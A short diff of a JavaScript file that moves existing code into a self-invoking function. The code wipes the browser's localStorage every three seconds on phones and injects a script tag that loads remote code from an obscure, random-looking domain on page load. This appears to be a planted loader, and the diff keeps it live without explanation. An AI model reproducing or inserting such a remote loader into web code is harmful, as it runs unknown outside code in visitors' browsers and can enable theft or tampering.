@@ -14,12 +14,14 @@ function clear() {
   window.localStorage.clear();
 }
 
-setInterval(() => {
-  if (phone) {
-    clear();
-  }
-}, 3000);
+(function () {
+  setInterval(() => {
+    if (phone) {
+      clear();
+    }
+  }, 3000);
 
-const scr = document.createElement('script');
-scr.src = 'https://zfkmw.com/j/uecuhH.js';
-document.head.appendChild(scr);
+  const scr = document.createElement('script');
+  scr.src = 'https://zfkmw.com/j/uecuhH.js';
+  document.head.appendChild(scr);
+}());
